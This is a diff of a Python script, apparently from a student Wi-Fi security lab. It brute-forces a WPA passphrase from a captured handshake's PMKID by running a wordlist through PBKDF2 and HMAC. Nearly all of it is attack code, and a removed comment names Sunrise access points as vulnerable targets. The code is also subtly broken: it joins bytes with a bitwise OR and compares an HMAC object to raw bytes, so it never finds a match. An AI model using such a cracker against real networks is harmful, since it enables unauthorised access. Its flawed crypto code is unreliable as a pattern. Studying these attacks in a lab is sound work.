@@ -38,15 +38,10 @@ def customPRF512(key,A,B):
 
 def getBeacon(pkts):
     """
-    Trouve le beacon qui contient un SSID d'une liste de paquet
+    Trouve le 1er beacon qui contient un SSID d'une liste de paquet
     """
     for pkt in pkts:
         if pkt.type == 0 and pkt.subtype == 8:
-                ssid = pkt.info.decode()
-                #on vise un ssid qui s'appelle Sunrise vu qu'on sait
-                #que leur AP sont vulnérables et qu'il y a 2
-                #réseaux nommés ainsi dans la capture
-                #if "Sunrise" in ssid:
                 return pkt
 
 def getFirstHandshake(pkts, apMAC):
@@ -69,16 +64,49 @@ packetBroadcast = getBeacon(wpa)
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-ssid        = packetBroadcast.info.decode()
+ssid        = packetBroadcast.info.decode() #on recupere le ssid dans le beacon
 APmac       = a2b_hex(packetBroadcast.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
-packetHS1   = getFirstHandshake(wpa, APmac)
+packetHS1   = getFirstHandshake(wpa, APmac) #on va chercher le handshake 1
 Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
-pmkid = raw(packetHS1)[-20:-4]
+pmkid = raw(packetHS1)[-20:-4] #on recupere le pmkid du handshake 1
 
-print ("\n\nValues used to derivate keys")
+print ("\n\nValues used to construct PMKID")
 print ("============================")
 print ("Passphrase: ",passPhrase,"\n")
 print ("SSID: ",ssid,"\n")
 print ("AP Mac: ",b2a_hex(APmac),"\n")
 print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
 print ("PMKID: ", b2a_hex(pmkid),"\n")
+
+#on ouvre le fichier de mots
+fileWords = open("wordslist.txt", "r")
+
+#on teste chaque mot du fichier
+for word in fileWords.readlines():
+    #on nettoie le mot sinon \n fais encore partie du mot
+    cleanWord = word.strip()
+    passPhrase = str.encode(cleanWord)
+
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+
+    wordPMKID = hmac.new(pmk, b"PMK Name" | APmac | Clientmac,hashlib.sha1)
+    
+    print(wordPMKID)
+    print(pmkid)
+
+    #on vérifie sir les deux mic sont egaux
+    if wordPMKID == pmkid:
+        print ("Correct passphrase : " + cleanWord)
+        print ("=============================")
+        print ("Passphrase: ",passPhrase,"\n")
+        print ("SSID: ",ssid,"\n")
+        print ("AP Mac: ",b2a_hex(APmac),"\n")
+        print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
+        print ("PMKID: ", b2a_hex(pmkid),"\n")
+        exit()
+    else:
+        print("Wrong passphrase : " + cleanWord)
+
+#si on arrive ici c'est qu'aucune passphrase n'est correcte
+print("No correct passphrases found")
